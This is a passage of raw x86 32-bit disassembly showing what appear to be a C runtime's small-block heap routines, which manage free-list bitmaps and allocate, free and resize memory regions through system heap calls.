  42692b:	sar    ebx,0x4
  42692e:	push   0x3f
  426930:	mov    DWORD PTR [ebp+0xc],esi
  426933:	dec    ebx
  426934:	pop    esi
  426935:	cmp    ebx,esi
  426937:	jbe    0x42693b
  426939:	mov    ebx,esi
  42693b:	add    ecx,DWORD PTR [ebp-0x8]
  42693e:	mov    edx,ecx
  426940:	sar    edx,0x4
  426943:	dec    edx
  426944:	cmp    edx,esi
  426946:	mov    DWORD PTR [ebp-0x4],ecx
  426949:	jbe    0x42694d
  42694b:	mov    edx,esi
  42694d:	cmp    ebx,edx
  42694f:	je     0x4269af
  426951:	mov    ecx,DWORD PTR [ebp+0xc]
  426954:	mov    esi,DWORD PTR [ecx+0x4]
  426957:	cmp    esi,DWORD PTR [ecx+0x8]
  42695a:	jne    0x426997
  42695c:	cmp    ebx,0x20
  42695f:	mov    esi,0x80000000
  426964:	jae    0x42697d
  426966:	mov    ecx,ebx
  426968:	shr    esi,cl
  42696a:	not    esi
  42696c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426970:	dec    BYTE PTR [ebx+eax*1+0x4]
  426974:	jne    0x426997
  426976:	mov    ecx,DWORD PTR [ebp+0x8]
  426979:	and    DWORD PTR [ecx],esi
  42697b:	jmp    0x426997
  42697d:	lea    ecx,[ebx-0x20]
  426980:	shr    esi,cl
  426982:	not    esi
  426984:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42698b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42698f:	jne    0x426997
  426991:	mov    ecx,DWORD PTR [ebp+0x8]
  426994:	and    DWORD PTR [ecx+0x4],esi
  426997:	mov    ecx,DWORD PTR [ebp+0xc]
  42699a:	mov    esi,DWORD PTR [ecx+0x8]
  42699d:	mov    ecx,DWORD PTR [ecx+0x4]
  4269a0:	mov    DWORD PTR [esi+0x4],ecx
  4269a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4269a6:	mov    esi,DWORD PTR [ecx+0x4]
  4269a9:	mov    ecx,DWORD PTR [ecx+0x8]
  4269ac:	mov    DWORD PTR [esi+0x8],ecx
  4269af:	mov    esi,DWORD PTR [ebp+0xc]
  4269b2:	jmp    0x4269b7
  4269b4:	mov    ebx,DWORD PTR [ebp+0x8]
  4269b7:	cmp    DWORD PTR [ebp-0xc],0x0
  4269bb:	jne    0x4269c5
  4269bd:	cmp    ebx,edx
  4269bf:	je     0x426a45
  4269c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4269c8:	lea    ecx,[ecx+edx*8]
  4269cb:	mov    ebx,DWORD PTR [ecx+0x4]
  4269ce:	mov    DWORD PTR [esi+0x8],ecx
  4269d1:	mov    DWORD PTR [esi+0x4],ebx
  4269d4:	mov    DWORD PTR [ecx+0x4],esi
  4269d7:	mov    ecx,DWORD PTR [esi+0x4]
  4269da:	mov    DWORD PTR [ecx+0x8],esi
  4269dd:	mov    ecx,DWORD PTR [esi+0x4]
  4269e0:	cmp    ecx,DWORD PTR [esi+0x8]
  4269e3:	jne    0x426a45
  4269e5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4269e9:	mov    BYTE PTR [ebp+0xf],cl
  4269ec:	inc    cl
  4269ee:	cmp    edx,0x20
  4269f1:	mov    BYTE PTR [edx+eax*1+0x4],cl
  4269f5:	jae    0x426a1c
  4269f7:	cmp    BYTE PTR [ebp+0xf],0x0
  4269fb:	jne    0x426a0b
  4269fd:	mov    ecx,edx
  4269ff:	mov    ebx,0x80000000
  426a04:	shr    ebx,cl
  426a06:	mov    ecx,DWORD PTR [ebp+0x8]
  426a09:	or     DWORD PTR [ecx],ebx
  426a0b:	mov    ebx,0x80000000
  426a10:	mov    ecx,edx
  426a12:	shr    ebx,cl
  426a14:	lea    eax,[eax+edi*4+0x44]
  426a18:	or     DWORD PTR [eax],ebx
  426a1a:	jmp    0x426a45
  426a1c:	cmp    BYTE PTR [ebp+0xf],0x0
  426a20:	jne    0x426a32
  426a22:	lea    ecx,[edx-0x20]
  426a25:	mov    ebx,0x80000000
  426a2a:	shr    ebx,cl
  426a2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426a2f:	or     DWORD PTR [ecx+0x4],ebx
  426a32:	lea    ecx,[edx-0x20]
  426a35:	mov    edx,0x80000000
  426a3a:	shr    edx,cl
  426a3c:	lea    eax,[eax+edi*4+0xc4]
  426a43:	or     DWORD PTR [eax],edx
  426a45:	mov    eax,DWORD PTR [ebp-0x4]
  426a48:	mov    DWORD PTR [esi],eax
  426a4a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  426a4e:	mov    eax,DWORD PTR [ebp-0x10]
  426a51:	dec    DWORD PTR [eax]
  426a53:	jne    0x426b50
  426a59:	mov    eax,ds:0x4639f8
  426a5e:	test   eax,eax
  426a60:	je     0x426b42
  426a66:	mov    ecx,DWORD PTR ds:0x463a10
  426a6c:	mov    esi,DWORD PTR ds:0x4290ec
  426a72:	push   0x4000
  426a77:	shl    ecx,0xf
  426a7a:	add    ecx,DWORD PTR [eax+0xc]
  426a7d:	mov    ebx,0x8000
  426a82:	push   ebx
  426a83:	push   ecx
  426a84:	call   esi
  426a86:	mov    ecx,DWORD PTR ds:0x463a10
  426a8c:	mov    eax,ds:0x4639f8
  426a91:	mov    edx,0x80000000
  426a96:	shr    edx,cl
  426a98:	or     DWORD PTR [eax+0x8],edx
  426a9b:	mov    eax,ds:0x4639f8
  426aa0:	mov    eax,DWORD PTR [eax+0x10]
  426aa3:	mov    ecx,DWORD PTR ds:0x463a10
  426aa9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426ab1:	mov    eax,ds:0x4639f8
  426ab6:	mov    eax,DWORD PTR [eax+0x10]
  426ab9:	dec    BYTE PTR [eax+0x43]
  426abc:	mov    eax,ds:0x4639f8
  426ac1:	mov    ecx,DWORD PTR [eax+0x10]
  426ac4:	cmp    BYTE PTR [ecx+0x43],0x0
  426ac8:	jne    0x426ad3
  426aca:	and    DWORD PTR [eax+0x4],0xfffffffe
  426ace:	mov    eax,ds:0x4639f8
  426ad3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426ad7:	jne    0x426b42
  426ad9:	push   ebx
  426ada:	push   0x0
  426adc:	push   DWORD PTR [eax+0xc]
  426adf:	call   esi
  426ae1:	mov    eax,ds:0x4639f8
  426ae6:	push   DWORD PTR [eax+0x10]
  426ae9:	push   0x0
  426aeb:	push   DWORD PTR ds:0x463c40
  426af1:	call   DWORD PTR ds:0x429034
  426af7:	mov    eax,ds:0x4639fc
  426afc:	mov    edx,DWORD PTR ds:0x463a00
  426b02:	lea    eax,[eax+eax*4]
  426b05:	shl    eax,0x2
  426b08:	mov    ecx,eax
  426b0a:	mov    eax,ds:0x4639f8
  426b0f:	sub    ecx,eax
  426b11:	lea    ecx,[ecx+edx*1-0x14]
  426b15:	push   ecx
  426b16:	lea    ecx,[eax+0x14]
  426b19:	push   ecx
  426b1a:	push   eax
  426b1b:	call   0x428370
  426b20:	mov    eax,DWORD PTR [ebp+0x8]
  426b23:	add    esp,0xc
  426b26:	dec    DWORD PTR ds:0x4639fc
  426b2c:	cmp    eax,DWORD PTR ds:0x4639f8
  426b32:	jbe    0x426b38
  426b34:	sub    DWORD PTR [ebp+0x8],0x14
  426b38:	mov    eax,ds:0x463a00
  426b3d:	mov    ds:0x463a08,eax
  426b42:	mov    eax,DWORD PTR [ebp+0x8]
  426b45:	mov    ds:0x4639f8,eax
  426b4a:	mov    DWORD PTR ds:0x463a10,edi
  426b50:	pop    ebx
  426b51:	pop    edi
  426b52:	pop    esi
  426b53:	leave  
  426b54:	ret    
  426b55:	mov    eax,ds:0x4639fc
  426b5a:	mov    ecx,DWORD PTR ds:0x463a0c
  426b60:	push   edi
  426b61:	xor    edi,edi
  426b63:	cmp    eax,ecx
  426b65:	jne    0x426b9b
  426b67:	lea    eax,[ecx+ecx*4+0x50]
  426b6b:	shl    eax,0x2
  426b6e:	push   eax
  426b6f:	push   DWORD PTR ds:0x463a00
  426b75:	push   edi
  426b76:	push   DWORD PTR ds:0x463c40
  426b7c:	call   DWORD PTR ds:0x42910c
  426b82:	cmp    eax,edi
  426b84:	jne    0x426b8a
  426b86:	xor    eax,eax
  426b88:	pop    edi
  426b89:	ret    
  426b8a:	add    DWORD PTR ds:0x463a0c,0x10
  426b91:	mov    ds:0x463a00,eax
  426b96:	mov    eax,ds:0x4639fc
  426b9b:	mov    ecx,DWORD PTR ds:0x463a00
  426ba1:	push   esi
  426ba2:	push   0x41c4
  426ba7:	push   0x8
  426ba9:	push   DWORD PTR ds:0x463c40
  426baf:	lea    eax,[eax+eax*4]
  426bb2:	lea    esi,[ecx+eax*4]
  426bb5:	call   DWORD PTR ds:0x429038
  426bbb:	cmp    eax,edi
  426bbd:	mov    DWORD PTR [esi+0x10],eax
  426bc0:	jne    0x426bc6
  426bc2:	xor    eax,eax
  426bc4:	jmp    0x426c09
  426bc6:	push   0x4
  426bc8:	push   0x2000
  426bcd:	push   0x100000
  426bd2:	push   edi
  426bd3:	call   DWORD PTR ds:0x429058
  426bd9:	cmp    eax,edi
  426bdb:	mov    DWORD PTR [esi+0xc],eax
  426bde:	jne    0x426bf2
  426be0:	push   DWORD PTR [esi+0x10]
  426be3:	push   edi
  426be4:	push   DWORD PTR ds:0x463c40
  426bea:	call   DWORD PTR ds:0x429034
  426bf0:	jmp    0x426bc2
  426bf2:	or     DWORD PTR [esi+0x8],0xffffffff
  426bf6:	mov    DWORD PTR [esi],edi
  426bf8:	mov    DWORD PTR [esi+0x4],edi
  426bfb:	inc    DWORD PTR ds:0x4639fc
  426c01:	mov    eax,DWORD PTR [esi+0x10]
  426c04:	or     DWORD PTR [eax],0xffffffff
  426c07:	mov    eax,esi
  426c09:	pop    esi
  426c0a:	pop    edi
  426c0b:	ret    
  426c0c:	push   ebp
  426c0d:	mov    ebp,esp
  426c0f:	push   ecx
  426c10:	push   ecx
  426c11:	mov    ecx,DWORD PTR [ebp+0x8]
  426c14:	mov    eax,DWORD PTR [ecx+0x8]
  426c17:	push   ebx
  426c18:	push   esi
  426c19:	mov    esi,DWORD PTR [ecx+0x10]
  426c1c:	push   edi
  426c1d:	xor    ebx,ebx
  426c1f:	jmp    0x426c24
  426c21:	shl    eax,1
  426c23:	inc    ebx
  426c24:	test   eax,eax
  426c26:	jge    0x426c21
  426c28:	mov    eax,ebx
  426c2a:	imul   eax,eax,0x204
  426c30:	lea    eax,[eax+esi*1+0x144]
  426c37:	push   0x3f
  426c39:	mov    DWORD PTR [ebp-0x8],eax
  426c3c:	pop    edx
  426c3d:	mov    DWORD PTR [eax+0x8],eax
  426c40:	mov    DWORD PTR [eax+0x4],eax
  426c43:	add    eax,0x8
  426c46:	dec    edx
  426c47:	jne    0x426c3d
  426c49:	push   0x4
  426c4b:	mov    edi,ebx
  426c4d:	push   0x1000
  426c52:	shl    edi,0xf
  426c55:	add    edi,DWORD PTR [ecx+0xc]
  426c58:	push   0x8000
  426c5d:	push   edi
  426c5e:	call   DWORD PTR ds:0x429058
  426c64:	test   eax,eax
  426c66:	jne    0x426c70
  426c68:	or     eax,0xffffffff
  426c6b:	jmp    0x426d0d
  426c70:	lea    edx,[edi+0x7000]
  426c76:	cmp    edi,edx
  426c78:	mov    DWORD PTR [ebp-0x4],edx
  426c7b:	ja     0x426cc0
  426c7d:	mov    ecx,edx
  426c7f:	sub    ecx,edi
  426c81:	shr    ecx,0xc
  426c84:	lea    eax,[edi+0x10]
  426c87:	inc    ecx
  426c88:	or     DWORD PTR [eax-0x8],0xffffffff
  426c8c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426c93:	lea    edx,[eax+0xffc]
  426c99:	mov    DWORD PTR [eax],edx
  426c9b:	lea    edx,[eax-0x1004]
  426ca1:	mov    DWORD PTR [eax-0x4],0xff0
  426ca8:	mov    DWORD PTR [eax+0x4],edx
  426cab:	mov    DWORD PTR [eax+0xfe8],0xff0
  426cb5:	add    eax,0x1000
  426cba:	dec    ecx
  426cbb:	jne    0x426c88
  426cbd:	mov    edx,DWORD PTR [ebp-0x4]
  426cc0:	mov    eax,DWORD PTR [ebp-0x8]
  426cc3:	add    eax,0x1f8
  426cc8:	lea    ecx,[edi+0xc]
  426ccb:	mov    DWORD PTR [eax+0x4],ecx
  426cce:	mov    DWORD PTR [ecx+0x8],eax
  426cd1:	lea    ecx,[edx+0xc]
  426cd4:	mov    DWORD PTR [eax+0x8],ecx
  426cd7:	mov    DWORD PTR [ecx+0x4],eax
  426cda:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426cdf:	xor    edi,edi
  426ce1:	inc    edi
  426ce2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426ce9:	mov    al,BYTE PTR [esi+0x43]
  426cec:	mov    cl,al
  426cee:	inc    cl
  426cf0:	test   al,al
  426cf2:	mov    eax,DWORD PTR [ebp+0x8]
  426cf5:	mov    BYTE PTR [esi+0x43],cl
  426cf8:	jne    0x426cfd
  426cfa:	or     DWORD PTR [eax+0x4],edi
  426cfd:	mov    edx,0x80000000
  426d02:	mov    ecx,ebx
  426d04:	shr    edx,cl
  426d06:	not    edx
  426d08:	and    DWORD PTR [eax+0x8],edx
  426d0b:	mov    eax,ebx
  426d0d:	pop    edi
  426d0e:	pop    esi
  426d0f:	pop    ebx
  426d10:	leave  
  426d11:	ret    
  426d12:	push   ebp
  426d13:	mov    ebp,esp
  426d15:	sub    esp,0xc
  426d18:	mov    ecx,DWORD PTR [ebp+0x8]
  426d1b:	mov    eax,DWORD PTR [ecx+0x10]
  426d1e:	push   ebx
  426d1f:	push   esi
  426d20:	mov    esi,DWORD PTR [ebp+0x10]
  426d23:	push   edi
  426d24:	mov    edi,DWORD PTR [ebp+0xc]
  426d27:	mov    edx,edi
  426d29:	sub    edx,DWORD PTR [ecx+0xc]
  426d2c:	add    esi,0x17
  426d2f:	shr    edx,0xf
  426d32:	mov    ecx,edx
  426d34:	imul   ecx,ecx,0x204
  426d3a:	lea    ecx,[ecx+eax*1+0x144]
  426d41:	mov    DWORD PTR [ebp-0xc],ecx
  426d44:	mov    ecx,DWORD PTR [edi-0x4]
  426d47:	and    esi,0xfffffff0
  426d4a:	dec    ecx
  426d4b:	cmp    esi,ecx
  426d4d:	lea    edi,[ecx+edi*1-0x4]
  426d51:	mov    ebx,DWORD PTR [edi]
  426d53:	mov    DWORD PTR [ebp+0x10],ecx
  426d56:	mov    DWORD PTR [ebp-0x4],ebx
  426d59:	jle    0x426eb4
  426d5f:	test   bl,0x1
  426d62:	jne    0x426ead
  426d68:	add    ebx,ecx
  426d6a:	cmp    esi,ebx
  426d6c:	jg     0x426ead
  426d72:	mov    ecx,DWORD PTR [ebp-0x4]
  426d75:	sar    ecx,0x4
  426d78:	dec    ecx
  426d79:	cmp    ecx,0x3f
  426d7c:	mov    DWORD PTR [ebp-0x8],ecx
  426d7f:	jbe    0x426d87
  426d81:	push   0x3f
  426d83:	pop    ecx
  426d84:	mov    DWORD PTR [ebp-0x8],ecx
  426d87:	mov    ebx,DWORD PTR [edi+0x4]
  426d8a:	cmp    ebx,DWORD PTR [edi+0x8]
  426d8d:	jne    0x426dd2
  426d8f:	cmp    ecx,0x20
  426d92:	mov    ebx,0x80000000
  426d97:	jae    0x426db3
  426d99:	shr    ebx,cl
  426d9b:	mov    ecx,DWORD PTR [ebp-0x8]
  426d9e:	lea    ecx,[ecx+eax*1+0x4]
  426da2:	not    ebx
  426da4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426da8:	dec    BYTE PTR [ecx]
  426daa:	jne    0x426dd2
  426dac:	mov    ecx,DWORD PTR [ebp+0x8]
  426daf:	and    DWORD PTR [ecx],ebx
  426db1:	jmp    0x426dd2
  426db3:	add    ecx,0xffffffe0
  426db6:	shr    ebx,cl
  426db8:	mov    ecx,DWORD PTR [ebp-0x8]
  426dbb:	lea    ecx,[ecx+eax*1+0x4]
  426dbf:	not    ebx
  426dc1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426dc8:	dec    BYTE PTR [ecx]
  426dca:	jne    0x426dd2
  426dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  426dcf:	and    DWORD PTR [ecx+0x4],ebx
  426dd2:	mov    ecx,DWORD PTR [edi+0x8]
  426dd5:	mov    ebx,DWORD PTR [edi+0x4]
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [edi+0x4]
  426dde:	mov    edi,DWORD PTR [edi+0x8]
  426de1:	mov    DWORD PTR [ecx+0x8],edi
  426de4:	mov    ecx,DWORD PTR [ebp+0x10]
  426de7:	sub    ecx,esi
  426de9:	add    DWORD PTR [ebp-0x4],ecx
  426dec:	cmp    DWORD PTR [ebp-0x4],0x0
  426df0:	jle    0x426e9b
  426df6:	mov    edi,DWORD PTR [ebp-0x4]
  426df9:	mov    ecx,DWORD PTR [ebp+0xc]
  426dfc:	sar    edi,0x4
  426dff:	dec    edi
  426e00:	cmp    edi,0x3f
  426e03:	lea    ecx,[ecx+esi*1-0x4]
  426e07:	jbe    0x426e0c
  426e09:	push   0x3f
  426e0b:	pop    edi
  426e0c:	mov    ebx,DWORD PTR [ebp-0xc]
  426e0f:	lea    ebx,[ebx+edi*8]
  426e12:	mov    DWORD PTR [ebp+0x10],ebx
  426e15:	mov    ebx,DWORD PTR [ebx+0x4]
  426e18:	mov    DWORD PTR [ecx+0x4],ebx
  426e1b:	mov    ebx,DWORD PTR [ebp+0x10]
  426e1e:	mov    DWORD PTR [ecx+0x8],ebx
  426e21:	mov    DWORD PTR [ebx+0x4],ecx
  426e24:	mov    ebx,DWORD PTR [ecx+0x4]
  426e27:	mov    DWORD PTR [ebx+0x8],ecx
  426e2a:	mov    ebx,DWORD PTR [ecx+0x4]
  426e2d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426e30:	jne    0x426e89
  426e32:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426e36:	mov    BYTE PTR [ebp+0x13],cl
  426e39:	inc    cl
  426e3b:	cmp    edi,0x20
  426e3e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426e42:	jae    0x426e60
  426e44:	cmp    BYTE PTR [ebp+0x13],0x0
  426e48:	jne    0x426e58
  426e4a:	mov    ecx,edi
  426e4c:	mov    ebx,0x80000000
  426e51:	shr    ebx,cl
  426e53:	mov    ecx,DWORD PTR [ebp+0x8]
  426e56:	or     DWORD PTR [ecx],ebx
  426e58:	lea    eax,[eax+edx*4+0x44]
  426e5c:	mov    ecx,edi
  426e5e:	jmp    0x426e80
  426e60:	cmp    BYTE PTR [ebp+0x13],0x0
  426e64:	jne    0x426e76
  426e66:	lea    ecx,[edi-0x20]
  426e69:	mov    ebx,0x80000000
  426e6e:	shr    ebx,cl
  426e70:	mov    ecx,DWORD PTR [ebp+0x8]
  426e73:	or     DWORD PTR [ecx+0x4],ebx
  426e76:	lea    eax,[eax+edx*4+0xc4]
  426e7d:	lea    ecx,[edi-0x20]
  426e80:	mov    edx,0x80000000
  426e85:	shr    edx,cl
  426e87:	or     DWORD PTR [eax],edx
  426e89:	mov    edx,DWORD PTR [ebp+0xc]
  426e8c:	mov    ecx,DWORD PTR [ebp-0x4]
  426e8f:	lea    eax,[edx+esi*1-0x4]
  426e93:	mov    DWORD PTR [eax],ecx
  426e95:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426e99:	jmp    0x426e9e
  426e9b:	mov    edx,DWORD PTR [ebp+0xc]
  426e9e:	lea    eax,[esi+0x1]
  426ea1:	mov    DWORD PTR [edx-0x4],eax
  426ea4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426ea8:	jmp    0x426fe9
  426ead:	xor    eax,eax
  426eaf:	jmp    0x426fec
  426eb4:	jge    0x426fe9
  426eba:	mov    ebx,DWORD PTR [ebp+0xc]
  426ebd:	sub    DWORD PTR [ebp+0x10],esi
  426ec0:	lea    ecx,[esi+0x1]
  426ec3:	mov    DWORD PTR [ebx-0x4],ecx
  426ec6:	lea    ebx,[ebx+esi*1-0x4]
  426eca:	mov    esi,DWORD PTR [ebp+0x10]
  426ecd:	sar    esi,0x4
  426ed0:	dec    esi
  426ed1:	cmp    esi,0x3f
  426ed4:	mov    DWORD PTR [ebp+0xc],ebx
  426ed7:	mov    DWORD PTR [ebx-0x4],ecx
  426eda:	jbe    0x426edf
  426edc:	push   0x3f
  426ede:	pop    esi
  426edf:	test   BYTE PTR [ebp-0x4],0x1
  426ee3:	jne    0x426f69
  426ee9:	mov    esi,DWORD PTR [ebp-0x4]
  426eec:	sar    esi,0x4
  426eef:	dec    esi
  426ef0:	cmp    esi,0x3f
  426ef3:	jbe    0x426ef8
  426ef5:	push   0x3f
  426ef7:	pop    esi
  426ef8:	mov    ecx,DWORD PTR [edi+0x4]
  426efb:	cmp    ecx,DWORD PTR [edi+0x8]
  426efe:	jne    0x426f42
  426f00:	cmp    esi,0x20
  426f03:	mov    ebx,0x80000000
  426f08:	jae    0x426f23
  426f0a:	mov    ecx,esi
  426f0c:	shr    ebx,cl
  426f0e:	lea    esi,[esi+eax*1+0x4]
  426f12:	not    ebx
  426f14:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426f18:	dec    BYTE PTR [esi]
  426f1a:	jne    0x426f3f
  426f1c:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1f:	and    DWORD PTR [ecx],ebx
  426f21:	jmp    0x426f3f
  426f23:	lea    ecx,[esi-0x20]
  426f26:	shr    ebx,cl
  426f28:	lea    ecx,[esi+eax*1+0x4]
  426f2c:	not    ebx
  426f2e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426f35:	dec    BYTE PTR [ecx]
  426f37:	jne    0x426f3f
  426f39:	mov    ecx,DWORD PTR [ebp+0x8]
  426f3c:	and    DWORD PTR [ecx+0x4],ebx
  426f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  426f42:	mov    ecx,DWORD PTR [edi+0x8]
  426f45:	mov    esi,DWORD PTR [edi+0x4]
  426f48:	mov    DWORD PTR [ecx+0x4],esi
  426f4b:	mov    esi,DWORD PTR [edi+0x8]
  426f4e:	mov    ecx,DWORD PTR [edi+0x4]
  426f51:	mov    DWORD PTR [ecx+0x8],esi
  426f54:	mov    esi,DWORD PTR [ebp+0x10]
  426f57:	add    esi,DWORD PTR [ebp-0x4]
  426f5a:	mov    DWORD PTR [ebp+0x10],esi
  426f5d:	sar    esi,0x4
  426f60:	dec    esi
  426f61:	cmp    esi,0x3f
  426f64:	jbe    0x426f69
  426f66:	push   0x3f
  426f68:	pop    esi
  426f69:	mov    ecx,DWORD PTR [ebp-0xc]
  426f6c:	lea    ecx,[ecx+esi*8]
  426f6f:	mov    edi,DWORD PTR [ecx+0x4]
  426f72:	mov    DWORD PTR [ebx+0x8],ecx
  426f75:	mov    DWORD PTR [ebx+0x4],edi
  426f78:	mov    DWORD PTR [ecx+0x4],ebx
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    DWORD PTR [ecx+0x8],ebx
  426f81:	mov    ecx,DWORD PTR [ebx+0x4]
  426f84:	cmp    ecx,DWORD PTR [ebx+0x8]
  426f87:	jne    0x426fe0
  426f89:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426f8d:	mov    BYTE PTR [ebp+0xf],cl
  426f90:	inc    cl
  426f92:	cmp    esi,0x20
  426f95:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426f99:	jae    0x426fb7
  426f9b:	cmp    BYTE PTR [ebp+0xf],0x0
  426f9f:	jne    0x426faf
  426fa1:	mov    ecx,esi
  426fa3:	mov    edi,0x80000000
  426fa8:	shr    edi,cl
  426faa:	mov    ecx,DWORD PTR [ebp+0x8]
  426fad:	or     DWORD PTR [ecx],edi
  426faf:	lea    eax,[eax+edx*4+0x44]
  426fb3:	mov    ecx,esi
  426fb5:	jmp    0x426fd7
  426fb7:	cmp    BYTE PTR [ebp+0xf],0x0
  426fbb:	jne    0x426fcd
  426fbd:	lea    ecx,[esi-0x20]
  426fc0:	mov    edi,0x80000000
  426fc5:	shr    edi,cl
  426fc7:	mov    ecx,DWORD PTR [ebp+0x8]
  426fca:	or     DWORD PTR [ecx+0x4],edi
  426fcd:	lea    eax,[eax+edx*4+0xc4]
  426fd4:	lea    ecx,[esi-0x20]
  426fd7:	mov    edx,0x80000000
  426fdc:	shr    edx,cl
  426fde:	or     DWORD PTR [eax],edx
  426fe0:	mov    eax,DWORD PTR [ebp+0x10]
  426fe3:	mov    DWORD PTR [ebx],eax
  426fe5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426fe9:	xor    eax,eax
  426feb:	inc    eax
  426fec:	pop    edi
  426fed:	pop    esi
  426fee:	pop    ebx
  426fef:	leave  
  426ff0:	ret    
  426ff1:	push   ebp
  426ff2:	mov    ebp,esp
  426ff4:	sub    esp,0x14
  426ff7:	mov    ecx,DWORD PTR [ebp+0x8]
  426ffa:	mov    eax,ds:0x4639fc
  426fff:	mov    edx,DWORD PTR ds:0x463a00
  427005:	add    ecx,0x17
  427008:	and    ecx,0xfffffff0
  42700b:	push   ebx
  42700c:	mov    DWORD PTR [ebp-0x10],ecx
  42700f:	sar    ecx,0x4
  427012:	push   esi
  427013:	lea    eax,[eax+eax*4]
  427016:	push   edi
  427017:	dec    ecx
  427018:	cmp    ecx,0x20
  42701b:	lea    edi,[edx+eax*4]
  42701e:	mov    DWORD PTR [ebp-0x4],edi
  427021:	jge    0x42702e
  427023:	or     esi,0xffffffff
  427026:	shr    esi,cl
  427028:	or     DWORD PTR [ebp-0x8],0xffffffff
  42702c:	jmp    0x42703b
  42702e:	add    ecx,0xffffffe0
  427031:	or     eax,0xffffffff
  427034:	xor    esi,esi
  427036:	shr    eax,cl
  427038:	mov    DWORD PTR [ebp-0x8],eax
  42703b:	mov    eax,ds:0x463a08
  427040:	mov    ebx,eax
  427042:	mov    DWORD PTR [ebp-0xc],esi
  427045:	cmp    ebx,edi
  427047:	jmp    0x42705d
  427049:	mov    ecx,DWORD PTR [ebx+0x4]
  42704c:	mov    edi,DWORD PTR [ebx]
  42704e:	and    ecx,DWORD PTR [ebp-0x8]
  427051:	and    edi,esi
  427053:	or     ecx,edi
  427055:	jne    0x427062
  427057:	add    ebx,0x14
  42705a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42705d:	mov    DWORD PTR [ebp+0x8],ebx
  427060:	jb     0x427049
  427062:	cmp    ebx,DWORD PTR [ebp-0x4]
  427065:	jne    0x42708b
  427067:	mov    ebx,edx
  427069:	jmp    0x42707c
  42706b:	mov    ecx,DWORD PTR [ebx+0x4]
  42706e:	mov    edi,DWORD PTR [ebx]
  427070:	and    ecx,DWORD PTR [ebp-0x8]
  427073:	and    edi,esi
  427075:	or     ecx,edi
  427077:	jne    0x427083
  427079:	add    ebx,0x14
  42707c:	cmp    ebx,eax
  42707e:	mov    DWORD PTR [ebp+0x8],ebx
  427081:	jb     0x42706b
  427083:	cmp    ebx,eax
  427085:	je     0x42711f
  42708b:	mov    DWORD PTR ds:0x463a08,ebx
  427091:	mov    eax,DWORD PTR [ebx+0x10]
  427094:	mov    edx,DWORD PTR [eax]
  427096:	cmp    edx,0xffffffff
  427099:	mov    DWORD PTR [ebp-0x4],edx
  42709c:	je     0x4270b2
  42709e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4270a5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4270a9:	and    ecx,DWORD PTR [ebp-0x8]
  4270ac:	and    edi,esi
  4270ae:	or     ecx,edi
  4270b0:	jne    0x4270e8
  4270b2:	mov    edx,DWORD PTR [eax+0xc4]
  4270b8:	and    edx,DWORD PTR [ebp-0x8]
  4270bb:	and    DWORD PTR [ebp-0x4],0x0
  4270bf:	lea    ecx,[eax+0x44]
  4270c2:	mov    esi,DWORD PTR [ecx]
  4270c4:	and    esi,DWORD PTR [ebp-0xc]
  4270c7:	or     edx,esi
  4270c9:	mov    esi,DWORD PTR [ebp-0xc]
  4270cc:	jne    0x4270e5
  4270ce:	mov    edx,DWORD PTR [ecx+0x84]
  4270d4:	and    edx,DWORD PTR [ebp-0x8]
  4270d7:	inc    DWORD PTR [ebp-0x4]
  4270da:	add    ecx,0x4
  4270dd:	mov    edi,DWORD PTR [ecx]
  4270df:	and    edi,esi
  4270e1:	or     edx,edi
  4270e3:	je     0x4270ce
  4270e5:	mov    edx,DWORD PTR [ebp-0x4]
  4270e8:	mov    ecx,edx
  4270ea:	imul   ecx,ecx,0x204
  4270f0:	lea    ecx,[ecx+eax*1+0x144]
  4270f7:	mov    DWORD PTR [ebp-0xc],ecx
  4270fa:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  4270fe:	xor    edi,edi
  427100:	and    ecx,esi
  427102:	jne    0x427171
  427104:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42710b:	and    ecx,DWORD PTR [ebp-0x8]
  42710e:	push   0x20
  427110:	pop    edi
  427111:	jmp    0x427171
  427113:	cmp    DWORD PTR [ebx+0x8],0x0
  427117:	jne    0x427124
  427119:	add    ebx,0x14
  42711c:	mov    DWORD PTR [ebp+0x8],ebx
  42711f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427122:	jb     0x427113
  427124:	cmp    ebx,DWORD PTR [ebp-0x4]
  427127:	jne    0x42714f
  427129:	mov    ebx,edx
  42712b:	jmp    0x427136
  42712d:	cmp    DWORD PTR [ebx+0x8],0x0
  427131:	jne    0x42713d
  427133:	add    ebx,0x14
  427136:	cmp    ebx,eax
  427138:	mov    DWORD PTR [ebp+0x8],ebx
  42713b:	jb     0x42712d
  42713d:	cmp    ebx,eax
  42713f:	jne    0x42714f
  427141:	call   0x426b55
  427146:	mov    ebx,eax
